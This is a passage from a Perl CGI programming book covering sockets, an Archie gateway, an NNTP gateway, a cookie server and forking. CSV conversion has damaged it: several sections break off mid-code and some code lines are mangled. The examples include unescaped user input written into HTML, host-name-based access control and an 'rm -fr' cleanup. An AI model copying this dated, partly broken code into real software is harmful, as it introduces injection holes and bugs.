and perform the appropriate conversion to a packed address string.,G,NA
Create a socket.,G,NA
Bind the socket to the current host.,G,NA
Connect the socket to the remote address and port.,G,NA
Unbuffer the socket.,NA,NA
"Now, here is the rest of the program.",NA,NA
"print FINGER $username, ""\n""; ",NA,NA
while (<FINGER>) {,NA,NA
 print; ,NA,NA
},NA,NA
&close_connection (FINGER);,NA,NA
exit (0);,NA,NA
The ,NA,NA
close_connection,NA,NA
 subroutine flushes the socket so that all the remaining information in the socket ,NA,NA
"is released, and then closes it. As you can see, this library makes the whole process of communicating ",NA,NA
"with network servers much easier. Now, let's look at a simple example that interacts with an HTTP ",NA,NA
server.,NA,NA
Socket I/O in Perl,NA,NA
Checking Hypertext (HTTP),NA,NA
Links,NA,NA
10.5 Checking Hypertext (HTTP) Links,"If you look back at the guestbook example in 
 Chapter 7, 
 Advanced Form Applications
 , you will notice that one of the 
 fields asked for the user's HTTP server. At that time, we did not discuss any methods to check if the address given by 
 the user is valid. However, with our new knowledge of sockets and network communication, we can, indeed, 
 determine the validity of the address. After all, web servers have to use the same Internet protocols as everyone else; 
 they possess no magic. If we open a TCP/IP socket connection to a web server, we can pass it commands it 
 recognizes, just as we passed a command to the 
 finger
  daemon (server). Before we go any further, here is a small 
 snippet of code from the guestbook that outputs the user-specified URL:
  
  
  if ($FORM{'www'}) {
  
  
  print GUESTBOOK <<End_of_Web_Address; <P> 
  
 $FORM{'name'} can also be reached at: 
  
 <A HREF=""$FORM{'www'}"">$FORM{'www'}</A> 
  
 End_of_Web_Address
  
  
  }
  
 Here is a subroutine that utilizes the socket library to check for valid URL addresses. It takes one argument, the URL 
 to check.
  
 sub check_url 
  
 {
  
  
  local ($url) = @_;
  
  
  local ($current_host, $host, $service, $file, $first_line);
  
  if (($host, $service, $file) = 
  
  
  
  ($url =~ m|http://([^/:]+):{0,1}(\d*)(\S*)$|)) {
  
 This regular expression parses the specified URL and retrieves the hostname, the port number (if included), and the 
 file.
  
 [Graphic: Figure from the text]
  
 Let's continue with the program:
  
  chop ($current_host = `\bin\hostname`);
  
  $host = $current_host  if ($host eq ""localhost""); 
 $service = ""http""      unless ($service);
  
  $file = ""/""            unless ($file);
  
 If the hostname is given as ""localhost"", the current hostname is used. In addition, the service name and the file are set 
 to ""http"", and ""/"", respectively, if no information was specified for these fields.
  
  &open_connection (HTTP, $host, $service) || return (0);    
 print HTTP ""HEAD $file HTTP/1.0"", ""\n\n"";",NA
10.6 Archie,NA,NA
Archie is a database/index of the numerous FTP sites (and their contents) throughout the world. You can use an ,NA,NA
"Archie client to search the database for specific files. In this example, we will use Brendan Kehoe's Archie client ",NA,NA
software (version 1.3) to connect to an Archie server and search for user-specified information. Though we could ,NA,NA
"have easily written a client using the socket library, it would be a waste of time, since an excellent one exists. This ",NA,NA
"Archie gateway is based on ArchiPlex, developed by Martijn Koster.",NA,NA
#!/usr/local/bin/perl ,NA,NA
"$webmaster = ""Shishir Gundavaram (shishir\@bu\.edu)""; ",NA,NA
"$archie = ""/usr/local/bin/archie""; ",NA,NA
"$error = ""CGI Archie Gateway Error""; ",NA,NA
"$default_server = ""archie.rutgers.edu""; ",NA,NA
$timeout_value = 180;,NA,NA
The ,NA,NA
archie,NA,NA
 variable contains the full path to the Archie client. Make sure you have an Archie client with this ,NA,NA
"pathname on your local machine; if you do not have a client, you have to telnet to a machine with a client and run ",NA,NA
this program there.,NA,NA
The default server to search is stored. This is used in case the user failed to select a server.,NA,NA
"Finally, ",NA,NA
timeout_value,NA,NA
 contains the number of seconds after which an gateway will return an error message and ,NA,NA
terminate. This is so that the user will not have to wait forever for the search results.,NA,NA
%servers = ( ,NA,NA
" 'ANS Net (New York, USA)',         'archie.ans.net',",NA,NA
" 'Australia',                       'archie.au',",NA,NA
" 'Canada',                          'archie.mcgill.ca', ",NA,NA
"'Finland/Mainland Europe',         'archie.funet.fi',",NA,NA
" 'Germany',                         'archie.th-darmstadt.de', ",NA,NA
"'Great Britain/Ireland',           'archie.doc.ac.ac.uk', ",NA,NA
"'Internic Net (New York, USA)',    'ds.internic.net',",NA,NA
" 'Israel',                          'archie.ac.il',",NA,NA
" 'Japan',                           'archie.wide.ad.jp', ",NA,NA
"'Korea',                           'archie.kr',",NA,NA
" 'New Zealand',                     'archie.nz',",NA,NA
" 'Rutgers University (NJ, USA)',    'archie.rutgers.edu', ",NA,NA
"'Spain',                           'archie.rediris.es', ",NA,NA
"'Sweden',                          'archie.luth.se',",NA,NA
" 'SURANet (Maryland, USA)',         'archie.sura.net',",NA,NA
" 'Switzerland',                     'archie.switch.ch', ",NA,NA
"'Taiwan',                          'archie.ncu.edu.tw', ",NA,NA
"'University of Nebrasksa (USA)',   'archie.unl.edu' );",NA,NA
Some of the Archie servers and their IP names are stored in an associative array. We will create the form for this,NA,NA
"gateway dynamically, listing all of the servers located in this array.",NA,NA
$request_method = $ENV{'REQUEST_METHOD'}; ,NA,NA
"if ($request_method eq ""GET"") {",NA,NA
 &display_form ();,NA,NA
The form will be created and displayed if this program was accessed with the browser.,NA,NA
"} elsif ($request_method eq ""POST"") { ",NA,NA
&parse_form_data (*FORM);,NA,NA
 $command = &parse_archie_fields ();,NA,NA
All of the form data is decoded and stored in the ,NA,NA
FORM,NA,NA
 associative array. The ,NA,NA
parse_archie_fields,NA,NA
 subroutine uses ,NA,NA
the form data in constructing a query to be passed to the Archie client.,NA,NA
" $SIG{'ALRM'} = ""time_to_exit"";",NA,NA
 alarm ($timeout_value);,NA,NA
"To understand how this array is used, you have to understand that the UNIX kernel checks every time an interrupt or ",NA,NA
"break arrives for a program, and asks, ""What routine should I call?"" The routine that the program wants called is a ",NA,NA
signal handler. Perl associates a handler with a signal in the SIG associative array.,NA,NA
"As shown above, the traditional way to implement a time-out is to set an ALRM signal to be called after a specified ",NA,NA
"number of seconds. The first line says that when an alarm is signaled, the ",NA,NA
time_to_exit,NA,NA
 subroutine should be executed. ,NA,NA
The Perl alarm call on the second line schedules the ALRM signal to be sent in the number of seconds represented by ,NA,NA
the ,NA,NA
$timeout_value,NA,NA
 variable.,NA,NA
" open (ARCHIE, ""$archie $command |"");",NA,NA
 $first_line = <ARCHIE>;,NA,NA
A pipe is opened to the Archie client. The ,NA,NA
command,NA,NA
" variable contains a ""query"" that specifies various command-line ",NA,NA
"options, such as search type and Archie server address, as well as the string to search for. The ",NA,NA
parse_archie_fields ,NA,NA
"subroutine makes sure that no shell metacharacters are specified, since the ",NA,NA
command,NA,NA
" variable is ""exposed"" to the ",NA,NA
shell.,NA,NA
 if ($first_line =~ /(failed|Usage|WARNING|Timed)/) {,NA,NA
 ,NA,NA
"&return_error (500, $error,",NA,NA
" ""The archie client encountered a bad request.""); ",NA,NA
} elsif ($first_line =~ /No [Mm]atches/) {,NA,NA
" &return_error (500, $error,",NA,NA
" ""There were no matches for <B>$FORM{'query'}</B>.""); ",NA,NA
},NA,NA
"If the first line from the Archie server contains either an error or a ""No Matches"" string, the ",NA,NA
return_error,NA,NA
 subroutine ,NA,NA
"is called to return a more friendly (and verbose) message. If there is no error, the first line is usually blank.",NA,NA
" print ""Content-type: text/html"", ""\n\n"";",NA,NA
" print ""<HTML>"", ""\n"";",NA,NA
" print ""<HEAD><TITLE>"", ""CGI Archie Gateway"", ""</TITLE></HEAD>"", ""\n""; ",NA,NA
"print ""<BODY>"", ""\n"";",NA,NA
" print ""<H1>"", ""Archie search for: "", $FORM{'query'}, ""</H1>"", ""\n""; ",NA,NA
"print ""<HR>"", ""<PRE>"", ""\n"";",NA,NA
"The usual type of header information is output. The following lines of code parse the output from the Archie server, ",NA,NA
and create hypertext links to the matched files. Here is the typical format for the Archie server output. It lists each ,NA,NA
"host where a desired file (in this case, ",NA,NA
emacs,NA,NA
") is found, followed by a list of all publicly accessible directories ",NA,NA
"containing a file of that name. Files are listed in long format, so you can see how old they are and what their sizes",NA,NA
are.,NA,NA
Host amadeus.ireq-robot.hydro.qc.ca,NA,NA
 Location: /pub,NA,NA
 DIRECTORY drwxr-xr-x        512  Dec 18 1990  emacs ,NA,NA
Host anubis.ac.hmc.edu,NA,NA
 Location: /pub,NA,NA
 DIRECTORY drwxr-xr-x        512  Dec  6 1994  emacs,NA,NA
 Location: /pub/emacs/packages/ffap,NA,NA
 DIRECTORY drwxr-xr-x        512  Apr  5 02:05  emacs,NA,NA
 Location: /pub/perl/dist,NA,NA
 DIRECTORY drwxr-xr-x        512  Aug 16 1994  emacs,NA,NA
 Location: /pub/perl/scripts/text-processing,NA,NA
 FILE -rwxrwxrwx         16  Feb 25 1994  emacs,NA,NA
"We can enhance this output by putting in hypertext links. That way, the user can open a connection to any of the ",NA,NA
hosts with a click of a button and retrieve the file. Here is the code to parse this output:,NA,NA
 while (<ARCHIE>) {,NA,NA
 if ( ($host) = /^Host (\S+)$/ ) {,NA,NA
" $host_url = join ("""", ""ftp://"", $host);",NA,NA
" s|$host|<A HREF=""$host_url"">$host</A>|;",NA,NA
 <ARCHIE>;,NA,NA
"If the line starts with a ""Host"", the specified host is stored. A URL to the host is created with the join function, using ",NA,NA
the ,NA,NA
ftp,NA,NA
" scheme and the hostname--for example, if the hostname were ",NA,NA
ftp.ora.com,NA,NA
", the URL would be ",NA,NA
ftp://ftp.ora.com,NA,NA
". Finally, the blank line after this line is discarded.",NA,NA
 } elsif (/^\s+Location:\s+(\S+)$/) {,NA,NA
 $location = $1;,NA,NA
" s|$location|<A HREF=""${host_url}${location}"">$location</A>|; ",NA,NA
"} elsif ( ($type, $file) = /^\s+(DIRECTORY|FILE).*\s+(\S+)/) {",NA,NA
 s|$type|<I>$type</I>|;,NA,NA
" s|$file|<A HREF=""${host_url}${location}/${file}"">$file</A>|; ",NA,NA
} elsif (/^\s*$/) {,NA,NA
" print ""<HR>"";",NA,NA
 },NA,NA
 },NA,NA
 print;,NA,NA
"One subtle feature of regular expressions is shown here: They are ""greedy,"" eating up as much text as they can. The ",NA,NA
"expression (DIRECTORY|FILE).*\s+ means match DIRECTORY or FILE, then match as many characters as you ",NA,NA
"can up to whitespace. There are chunks of whitespace throughout the line, but the .* takes up everything up to the ",NA,NA
"last whitespace. This leaves just the word ""emacs"" to match the final parenthesized expression (\S+).",[Graphic: Figure from the text],NA
The rest of the lines are read and parsed in the same manner and displayed (see ,NA,NA
Figure 10.1,NA,NA
"). If the line is empty, a ",NA,NA
horizontal rule is output--to indicate the end of each entry.,NA,NA
Figure 10.1: Archie results,"[Graphic: 
  
  
 Figure 10-1]",NA
" $SIG{'ALRM'} = ""DEFAULT"";",NA,NA
 close (ARCHIE);,NA,NA
" print ""</PRE>"";",NA,NA
" print ""</BODY></HTML>"", ""\n"";",NA,NA
"Finally, the ALRM signal is reset, and the file handle is closed.",NA,NA
} else {,NA,NA
" &return_error (500, $error, ""Server uses unspecified method""); ",NA,NA
} ,NA,NA
exit (0);,NA,NA
Remember how we set the SIG array so that a signal would cause the ,NA,NA
time_to_exit,NA,NA
 subroutine to run? Here it is:,NA,NA
sub time_to_exit ,NA,NA
{,NA,NA
 close (ARCHIE);,NA,NA
" &return_error (500, $error,",NA,NA
" ""The search was terminated after $timeout_value seconds.""); ",NA,NA
},NA,NA
"When this subroutine runs, it means that the 180 seconds that were allowed for the search have passed, and that it is ",NA,NA
"time to terminate the script. Generally, the Archie server returns the matched FTP sites and its files quickly, but ",NA,NA
"there are times when it can be queued up with requests. In such a case, it is wise to terminate the script, rather than ",NA,NA
let the user wait for a long period of time.,NA,NA
"Now, we have to build a command that the Archie client recognizes using the ",NA,NA
parse_archie_fields subroutine,NA,NA
:,NA,NA
sub parse_archie_fields ,NA,NA
{,NA,NA
" local ($query, $server, $type, $address, $status, $options);",NA,NA
 $status = 1;,NA,NA
 $query = $FORM{'query'};,NA,NA
 $server = $FORM{'server'};,NA,NA
 $type = $FORM{'type'};,NA,NA
 if ($query !~ /^\w+$/) {,NA,NA
" &return_error (500, $error, ",NA,NA
" ""Search query contains invalid characters."");",NA,NA
If the ,NA,NA
query,NA,NA
" field contains non-alphanumeric characters (characters other than A-Z, a-z, 0-9, _), an error message is ",NA,NA
output.,NA,NA
 } else {,NA,NA
 foreach $address (keys %servers) {,NA,NA
 if ($server eq $address) {,NA,NA
 $server = $servers{$address};,NA,NA
 $status = 0;,NA,NA
 },NA,NA
 },NA,NA
The ,NA,NA
foreach,NA,NA
 loop iterates through the keys of the ,NA,NA
servers,NA,NA
 associative array. If the user-specified server matches the ,NA,NA
"name as contained in the array, the IP name is stored in the server variable, and the status is set to zero.",NA,NA
 if ($status) {,NA,NA
" &return_error (500, $error, ""Please select a valid archie host."");",NA,NA
A status of non-zero indicates that the user specified an invalid address for the Archie server.,NA,NA
 } else {,NA,NA
" if ($type eq ""cs_sub"") {",NA,NA
" $type = ""-c"";",NA,NA
" } elsif ($type eq ""ci_sub"") {",NA,NA
" $type = ""-s"";",NA,NA
 } else {,NA,NA
" $type = ""-e"";",NA,NA
 },NA,NA
"If the user selected ""Case Sensitive Substring"", the ""-c"" switch is used. The ""-s"" switch indicates a ""Case Insensitive ",NA,NA
"Substring"". If the user did not select any option, the ""-e"" switch (""Exact Match"") is used.",NA,NA
},NA,NA
 },NA,NA
 },NA,NA
" $options = ""-h $server $type $query"";",NA,NA
 return ($options);,NA,NA
"A string containing all of the options is created, and then returned to the main program.",NA,NA
"Our last task is a simple one--to create a form that allows the user to enter a query, using the ",NA,NA
display_form ,NA,NA
subroutine. ,NA,NA
"The program creates the form dynamically because some information is subject to change (i.e., the list of servers).",NA,NA
sub display_form ,NA,NA
{,NA,NA
 local ($archie);,NA,NA
 print <<End_of_Archie_One; ,NA,NA
Content-type: text/html ,NA,NA
<HTML> ,NA,NA
<HEAD><TITLE>Gateway to Internet Information Servers</TITLE></HEAD> ,NA,NA
<BODY> ,NA,NA
<H1>CGI Archie Gateway</H1> ,NA,NA
<HR> ,NA,NA
"<FORM ACTION=""/cgi-bin/archie.pl"" METHOD=""POST""> ",NA,NA
Please enter a string to search from: <BR> ,NA,NA
"<INPUT TYPE=""text"" NAME=""query"" SIZE=40> ",NA,NA
<P> ,NA,NA
"What archie server would you like to use (<B>please</B>, be considerate ",NA,NA
and use the one that is closest to you): <BR> ,NA,NA
"<SELECT NAME=""server"" SIZE=1> ",NA,NA
End_of_Archie_One,NA,NA
 foreach $archie (sort keys %servers) {,NA,NA
 if ($servers{$archie} eq $default_server) {,NA,NA
" print ""<OPTION SELECTED>"", $archie, ""\n"";",NA,NA
 } else {,NA,NA
" print ""<OPTION>"", $archie, ""\n"";",NA,NA
 },NA,NA
 }        ,NA,NA
This loop iterates through the associative array and displays all of the server names.,NA,NA
 print <<End_of_Archie_Two; ,NA,NA
</SELECT> ,NA,NA
<P>,NA,NA
Please select a type of search to perform: <BR> ,NA,NA
"<INPUT TYPE=""radio"" NAME=""type"" VALUE=""exact"" CHECKED>Exact<BR> ",NA,NA
"<INPUT TYPE=""radio"" NAME=""type"" VALUE=""ci_sub"">Case Insensitive Substring<BR> ",NA,NA
"<INPUT TYPE=""radio"" NAME=""type"" VALUE=""cs_sub"">Case Sensitive Substring<BR> ",NA,NA
<P> ,NA,NA
"<INPUT TYPE=""submit"" VALUE=""Start Archie Search!""> ",NA,NA
"<INPUT TYPE=""reset""  VALUE=""Clear the form""> ",NA,NA
</FORM> ,NA,NA
<HR> ,NA,NA
</BODY> ,NA,NA
</HTML> ,NA,NA
End_of_Archie_Two ,NA,NA
},NA,NA
The dynamic form looks like that in ,NA,NA
Figure 10.2,NA,NA
.,NA,NA
Figure 10.2: Archie form,"[Graphic: 
  
 Figure 10-2]",NA
"This was a rather simple program because we did not have to deal with the Archie server directly, but rather through ",NA,NA
"a pre-existing client. Now, we will look at an example that is a little bit more complicated.",NA,NA
Checking Hypertext (HTTP),NA,NA
Links,NA,NA
Network News on the Web,NA,NA
10.7 Network News on the Web,"NNTP (Network News Transfer Protocol) is the most popular software used to transmit Usenet news over the Internet. 
 It lets the receiving (client) system tell the sending (server) system which newsgroups to send, and which articles from 
 each group. NNTP accepts commands in a fairly simple format. It sends back a stream of text consisting of the articles 
 posted and occasional status information.
  
 This CGI gateway communicates with an NTTP server directly by using socket I/O. The program displays lists of 
 newsgroups and articles for the user to choose from. You will be able to read news from the specified newsgroups in a 
 threaded fashion (all the replies to each article are grouped together).
  
 #!/usr/local/bin/perl 
  
 require ""sockets.pl""; 
  
 $webmaster = ""Shishir Gundavaram (shishir\@bu\.edu)""; 
  
 $error = ""CGI NNTP Gateway Error""; 
  
 %groups = ( 'cgi',     'comp.infosystems.www.authoring.cgi', 
 'html',    'comp.infosystems.www.authoring.html', 'images',  
 'comp.infosystems.www.authoring.images', 'misc',    
 'comp.infosystems.www.authoring.misc', 'perl',    
 'comp.lang.perl.misc' );
  
 The 
 groups
  associative array contains a list of the newsgroups that will be displayed when the form is dynamically 
 created.
  
 $all_groups = '(cgi|html|images|misc|perl)';
  
 The 
 all_groups
  variable contains a regular expression listing all of the keys of the 
 groups
  associative array. This will 
 be used to ensure that a valid newsgroup is specified by the user.
  
 $nntp_server = ""nntp.bu.edu"";
  
 The NNTP server is set to ""nntp.bu.edu"". If you do not want users from domains other than ""bu.edu"" to access this 
 form, you can set up a simple authentication scheme like this:
  
 $allowed_domain = ""bu.edu""; 
  
 $remote_host = $ENV{'REMOTE_HOST'}; 
  
 ($remote_domain) = ($remote_host =~ /([^.]+\.[^.]+)$/); 
  
 if ($remote_domain ne $allowed_domain) {
  
  
  &return_error (500, $error, ""Sorry! You are not allowed to read news!""); 
 }
  
 The regular expression used above extracts the domain name from an IP name or address.
  
 [Graphic: Figure from the text]
  
 Or, you can allow multiple domains like this:",NA
10.8 Magic Cookies,NA,NA
"In Chapter 8, we introduced you to some of the problems of working with multiple forms, and ",NA,NA
"presented a few possible solutions. In this chapter, we approach the problem again, using our new ",NA,NA
familiarity with clients and servers.,NA,NA
An interface consisting of multiple forms presents thorny problems for CGI. How do you remember ,NA,NA
the information stored on different forms? A normal graphical interface application (running on a ,NA,NA
"local machine) simply displays forms and stores results, as shown in ",NA,NA
Figure 10.4,NA,NA
.,NA,NA
Figure 10.4: A local application handling multiple forms,"[Graphic: 
  
 Figure 10-4]",NA
It is easy to store information from successive forms when a client and a server are not involved. But ,NA,NA
"when you use CGI, the server invokes the program repeatedly each time a form is submitted. Instead ",NA,NA
"of a single running program, you have multiple instances, as shown in ",NA,NA
Figure 10.5,NA,NA
.,NA,NA
Figure 10.5: Multiple forms over a server,"[Graphic: 
  
 Figure 10-5]",NA
The problem you face is how to tell each instance of the program what data was retrieved by the ,NA,NA
previous runs.,NA,NA
"Temporary files are a simple solution, but a messy one. The program has to know which file to read ",NA,NA
and write each time. Knowing the right file is complicated when multiple users are running the ,NA,NA
"program at the same time. Furthermore, the information is not very secure, because the files are ",NA,NA
"visible on the system. The time required to access the files can slow down the operation. Finally, you ",NA,NA
"have to remember to clean up the files, when the user goes away and does not finish the session.",NA,NA
A much more elegant solution involves a special server whose job is to maintain state for CGI ,NA,NA
"programs. This server runs continuously, like any other server. CGI programs of all types and ",NA,NA
purposes can use this server to store information. The big advantage that a server has over temporary ,NA,NA
files is that the data remains in memory. This makes operations faster and keeps the data much more ,NA,NA
secure.,NA,NA
The heart of the server approach is that a CGI program knows how to retrieve data that a previous ,NA,NA
instance of the program sent to the server. Each instance of the program needs a kind of handle so it ,NA,NA
"can find the data. To furnish this access, the server associates a unique identifier with each user who ",NA,NA
"runs the CGI program. The program supplies the identifier when it stores the data, and another ",NA,NA
"instance of the program supplies the identifier again to retrieve the data. Given to colorful language, ",NA,NA
"computer people like to call such identifiers ""magic cookies."" Using a single cookie, a CGI program ",NA,NA
"can keep track of any amount of data. So the server is called a cookie server, while the CGI program ",NA,NA
is called the cookie client.,NA,NA
Another major problem has to be solved to use cookies. One instance of the CGI program has to pass ,NA,NA
the cookie to the next instance. If you look at ,NA,NA
Figure 10.5,NA,NA
", you may see the solution in the arrows:",NA,NA
"Pass the cookie to the next form, and have the form pass it back. This is the solution we will use in ",NA,NA
"this book. When the CGI program builds each form, it embeds the cookie in a hidden field. When the ",NA,NA
"user submits the form, it passes back the hidden field. The new instance of the program, when it starts ",NA,NA
"up, can retrieve the cookie like any other field, and ask the server for the data. The procedure is shown ",NA,NA
in ,NA,NA
Figure 10.6,NA,NA
.,NA,NA
Figure 10.6: Cookie server interaction with a Web client and server,"[Graphic: 
  
 Figure 10-6]",NA
"Let's trace a cookie, and the data associated with it, through a complete session.",G,NA
"The user fills out the first form, and the CGI program is invoked for the first time.","G 
  
 G 
  
 G 
  
 G",NA
The CGI program contacts the server for the first time. The server creates a cookie and passes it ,NA,NA
"to the program. The program also passes data to the server, using the cookie given to it by the ",NA,NA
server.,NA,NA
"The program creates the next form for the user, embeds the cookie in a hidden field, and sends ",NA,NA
the form to the browser.,NA,NA
"The browser displays the form, which is filled out by the user and submitted. The form passes ",NA,NA
back the hidden field with the cookie.,NA,NA
"A new instance of the CGI program begins. It gets the cookie from the form data, and starts ",NA,NA
"contacting the server all over again. This time, the program passes the existing cookie instead of ",NA,NA
creating a new one.,NA,NA
"This is our strategy. Understanding this, you should not have much trouble following the code that is ",NA,NA
about to follow.,NA,NA
Network News on the Web,NA,NA
Maintaining State with a,NA,NA
Server,NA,NA
10.9 Maintaining State with a Server,"In 
 Chapter 8, 
 Multiple Form Interaction
 , we looked at several techniques for keeping track of information between 
 multiple forms. They involved using temporary files, hidden variables, and Netscape Persistent Cookies. Now, we 
 will look at yet another method to keep state. This involves communicating with a server--The Cookie Server--to 
 store and retrieve information.
  
 It will help you understand how cookies work if you see real programs use them. So we will examine a CGI program 
 that displays two forms, and that stores the information returned by calling the cookie server. Here is the first form:
  
 <HTML> 
  
 <HEAD><TITLE>College/School Survey</TITLE></HEAD> 
  
 <BODY> 
  
 <H1>Interests</H1> 
  
 <HR> 
  
 <FORM ACTION=""/cgi-bin/cookie_client.pl?next=/location.html"" METHOD=""POST"">
  
 The ACTION attribute specifies the next form in the series as a query string. The filename is relative to the document 
 root directory.
  
 <INPUT TYPE=""hidden"" NAME=""Magic_Cookie"" VALUE=""-*Cookie*-"">
  
 The string ""-*Cookie*-"" will be replaced by a random cookie identifier when this form is parsed by the CGI program. 
 This cookie is used to uniquely identify the form information.
  
 What subject are you interested in? <BR> 
  
 <INPUT TYPE=""text"" NAME=""subject"" SIZE=40> 
  
 <P> 
  
 What extra-curricular activity do you enjoy the most? <BR> 
 <INPUT TYPE=""text"" NAME=""interest"" SIZE=40> 
  
 <P> 
  
 <INPUT TYPE=""submit"" VALUE=""See Next Form!""> 
  
 <INPUT TYPE=""reset""  VALUE=""Clear the form""> 
  
 </FORM> 
  
 <HR> 
  
 </BODY> 
  
 </HTML>
  
 Here is the second form in the series. It should be stored in a file named 
 location.html
  because that name was 
 specified in the ACTION attribute of the first form.
  
 <HTML> 
  
 <HEAD><TITLE>College/School Survey</TITLE></HEAD> 
 <BODY> 
  
 <H1>Location</H1>",NA
Cookie Server,"Here I will show a general purpose server for CGI programs running on the local systems. Each CGI program is a 
 cookie client. When it connects, this server enters a long loop accepting commands, as we will see in a moment. 
 Please note that this is not a CGI script. Instead, it provides a data storage service for CGI scripts.
  
 #!/usr/local/bin/perl 
  
 require ""sockets.pl""; 
  
 srand (time|$$);
  
 The 
 srand
  function sets the random number seed. A logical OR of the current time and the process identification 
 number (PID) creates a very good seed.
  
 $HTTP_server = ""128.197.27.7"";
  
 The IP address of the HTTP server from where the CGI scripts will connect to this server is specified. This is used to 
 prevent CGI programs running on other HTTP servers on the Web to communicate with this server.
  
 $separator = ""\034""; 
  
 $expire_time = 15 * 60;
  
 The 
 expire_time
  variable sets the time (in seconds) for which a cookie is valid. In this case, a cookie is valid for 15 
 minutes.
  
 %DATA = (); 
  
 $max_cookies = 10; 
  
 $no_cookies = 0;
  
 The 
 DATA
  associative array is used to hold the form information. The 
 max_cookies
  variable sets the limit for the 
 number of cookies that can be active at one time. And the 
 no_cookies
  variable is a counter that keeps track of the 
 number of active cookies.
  
 $error = 500; 
  
 $success = 200;",NA
Cookie Client,"Let's review what a cookie client is, and what it needs from a server. A client is a CGI program that has to run many 
 times for each user (usually because it displays multiple forms and is invoked each time by each form). The program 
 needs to open a connection to the cookie server, create a cookie, and store information in it. The information stored 
 for one form is retrieved later when the user submits another form.
  
 #!/usr/local/bin/perl 
  
 require ""sockets.pl""; 
  
 $webmaster = ""Shishir Gundavaram (shishir\@bu\.edu)""; 
 $remote_address = $ENV{'REMOTE_ADDR'};
  
 The remote address of the host that is connected to this HTTP server is stored. This information will be used to create 
 unique cookies.
  
 $cookie_server = ""cgi.bu.edu""; 
  
 $cookie_port = 5000; 
  
 $document_root = ""/usr/local/bin/httpd_1.4.2/public""; 
 $error = ""Cookie Client Error""; 
  
 &parse_form_data (*FORM); 
  
 $start_form = $FORM{'start'}; 
  
 $next_form = $FORM{'next'};",NA
10.10 Forking/Spawning Child Processes,NA,NA
"Before we end this chapter, let's look at a very powerful feature found on the UNIX operating system: ",NA,NA
concurrent processes.,NA,NA
"The cookie server we discussed can accept only one connection at a time, although it will queue up to five ",NA,NA
"connections, which it will handle sequentially, one after the other. Because of the way the server operates-",NA,NA
-storing information in variables--it cannot be designed to handle multiple connections simultaneously. ,NA,NA
Let's look at the reason for this.,NA,NA
"In UNIX, a process (parent) has the ability to create another process (child) that executes some given code ",NA,NA
"independently. This can be really useful for programs that need a lot of time to finish. For example, if you ",NA,NA
"have a CGI program that needs to calculate some complex equation, search large databases, or delete and ",NA,NA
"cleanup a lot of files, you can ""spawn"" a child process that performs the task, while the parent returns ",NA,NA
"control to the browser. In such a case, the user does not have to wait for the task to finish, because the ",NA,NA
child process is running in the background. Let's look at a simple CGI program:,NA,NA
#!/usr/local/bin/perl ,NA,NA
$| = 1; ,NA,NA
"print ""Content-type: text/plain"", ""\n\n""; ",NA,NA
"print ""We are about to create the child!"", ""\n""; ",NA,NA
if ($pid = fork) {,NA,NA
 print <<End_of_Parent; ,NA,NA
I am the parent speaking. I have successfully created a child process. ,NA,NA
The Process Identification Number (PID) of the child process is: $pid. ,NA,NA
The child will be cleaning up all the files in the directory. It might ,NA,NA
"take a while, but you do not have to wait!",NA,NA
End_of_Parent,NA,NA
} else {,NA,NA
 close (STDOUT);,NA,NA
" system (""/usr/bin/rm"", ""-fr"", ""/tmp/CGI_test"", ""/var/tmp/CGI""); ",NA,NA
exit(0); ,NA,NA
} ,NA,NA
"print ""I am the parent again! NOAow it is time to exit."", ""\n""; ",NA,NA
"print ""My child process will work on its own! Good Bye!"", ""\n""; ",NA,NA
exit(0);,NA,NA
The ,NA,NA
fork,NA,NA
" command actually creates a child process, and returns the PID of the process to the parent, and a",NA,NA
"value of zero to the child. In this example, the first block of code is executed by the parent, while the ",NA,NA
second block is executed by the child. The one thing you have to note is that the child process gets a copy ,NA,NA
"of all the variables and subroutines that are available to the parent. However, if the child process makes ",NA,NA
"any modifications at all, they are simply discarded when it exits; they do not affect the parent process.",NA,NA
This is the main reason why the cookie server cannot handle multiple connections. There are two issues ,NA,NA
here. The first is that multiple connections are not supported. Once the CGI program connects to the ,NA,NA
"server, the server handles requests from the program, and so cannot accept any more connections until the ",NA,NA
program breaks the connection. The only way to allow multiple connections is to fork a process every ,NA,NA
"time there is a connection, so there is a new process to handle each connection.",NA,NA
"This leads us to the second issue. If there is a separate child process to handle each connection, then each ",NA,NA
process would have its own variable ,NA,NA
namespace,NA,NA
 (along with a copy of the parent's data). If a child process ,NA,NA
"modifies or stores new data (in variables), then that data is gone once the process terminates, and there is ",NA,NA
no way to pass that data back to the parent. That's why we only have one server that keeps track of the ,NA,NA
data one connection at a time.,NA,NA
The ,NA,NA
system,NA,NA
 command that we have been using to execute UNIX commands is implemented in the ,NA,NA
following way:,NA,NA
unless (fork) {,NA,NA
" exec (""command"");",NA,NA
},NA,NA
wait;,NA,NA
This is identical to:,NA,NA
"system (""command"");",NA,NA
"Basically, the child process--the ",NA,NA
unless,NA,NA
 block executes only if the return value from fork is zero--executes ,NA,NA
"the specified command, while the parent waits for it to finish. Here is how we could implement a server ",NA,NA
that handles multiple connections simultaneously (although this approach will not work for our cookie ,NA,NA
server):,NA,NA
"$SIG{'CHLD'} = ""wait_for_child_to_die"";",NA,NA
while (1) {,NA,NA
" ( ($ip_name, $ip_address) = &accept_connection (COOKIE, SOCKET) )",NA,NA
" || die ""Could not accept connection."", ""\n"";",NA,NA
 if (fork) {,NA,NA
 #,NA,NA
 # Parent Process (do almost nothing here),NA,NA
 #,NA,NA
 } else {,NA,NA
 #,NA,NA
 # Child Process (do almost everything here),NA,NA
 #,NA,NA
 },NA,NA
 &close_connection (COOKIE);    ,NA,NA
},NA,NA
sub wait_for_child_to_die,NA,NA
{,NA,NA
},NA,NA
 wait;,NA,NA
"One important note: If a parent does not wait for a child process to die, certain ""zombie"" processes will be ",NA,NA
left on the system.,NA,NA
Maintaining State with a,NA,NA
Server,NA,NA
Advanced and Creative CGI,NA,NA
Applications,NA,NA
11. Advanced and Creative CGI Applications,NA,NA
Contents: ,NA,NA
Animated Clock ,NA,NA
Game of Concentration,NA,NA
Introduction to Imagemaps,NA,NA
Calendar Manager,NA,NA
"In this final chapter of practical advice and code, we will look at three applications: a simple animated clock, the ",NA,NA
"game of Concentration, and a Calendar Manager. All three of these examples utilize a combination of the various ",NA,NA
techniques presented up to this point.,NA,NA
11.1 Animated Clock,NA,NA
This example creates the effect of an animated digital clock by repeatedly generating dynamic GIF images and ,NA,NA
sending them to the browser using server push (see the discussion in ,NA,NA
"Chapter 6, ",NA,NA
Hypermedia Documents,NA,NA
). You,NA,NA
can use the techniques presented in this example to create CGI programs that continuously display such ,NA,NA
